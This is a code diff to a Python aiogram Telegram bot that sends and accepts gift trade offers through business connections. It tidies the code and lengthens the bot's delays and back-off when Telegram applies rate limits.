@@ -1,6 +1,5 @@
 import asyncio
 import random
-import time
 import logging
 from aiogram import Bot, Dispatcher, F
 from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions
@@ -17,7 +16,6 @@ bot = Bot(token=TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
 
 message_queue = asyncio.Queue()
-cooldowns = {}
 client_user_ids = {}
 
 LOCALES = {
@@ -203,11 +201,12 @@ async def accept_offer(cb: CallbackQuery):
     text = build_accept_text(gift_name, gift_num, currency_name, lang)
     bcid = cb.message.business_connection_id
     chat_id = cb.message.chat.id
+    message_id = cb.message.message_id
 
     try:
         await bot.edit_message_text(
             chat_id=chat_id,
-            message_id=cb.message.message_id,
+            message_id=message_id,
             text=text,
             parse_mode=ParseMode.HTML,
             reply_markup=make_accept_keyboard(lang),
@@ -221,7 +220,7 @@ async def accept_offer(cb: CallbackQuery):
             try:
                 await bot.edit_message_reply_markup(
                     chat_id=chat_id,
-                    message_id=cb.message.message_id,
+                    message_id=message_id,
                     reply_markup=None,
                     business_connection_id=bcid
                 )
@@ -248,7 +247,7 @@ async def sender_worker():
     while True:
         task = await message_queue.get()
         try:
-            await asyncio.sleep(random.uniform(0.5, 1.0))
+            await asyncio.sleep(random.uniform(1.5, 3.0))
 
             text = build_offer_text(task["gift_name"], task["gift_num"], task["amount"], task["currency_type"], task["lang"])
             keyboard = make_offer_keyboard(task["gift_name"], task["gift_num"], task["amount"], task["currency_type"], task["lang"])
@@ -266,7 +265,7 @@ async def sender_worker():
                 await bot.delete_business_messages(business_connection_id=task["bcid"], message_ids=[task["cmd_message_id"]])
 
         except TelegramRetryAfter as e:
-            wait_time = e.retry_after + 1
+            wait_time = e.retry_after + 5
             logging.warning(f"Global flood control! Waiting {wait_time}s.")
             await asyncio.sleep(wait_time)
             await message_queue.put(task)
@@ -275,13 +274,7 @@ async def sender_worker():
             error_str = str(e)
             if "PEER_FLOOD" in error_str:
                 logging.warning(f"PEER_FLOOD caught in chat {task['chat_id']}")
-                target_user_id = client_user_ids.get(task["chat_id"])
-                loc = LOCALES.get(task["lang"], LOCALES["ru"])
-                if target_user_id:
-                    try:
-                        await bot.send_message(chat_id=target_user_id, text=loc["flood_error"])
-                    except Exception:
-                        pass
+                await asyncio.sleep(10)
             else:
                 logging.error(f"Worker error: {error_str}")
         finally:
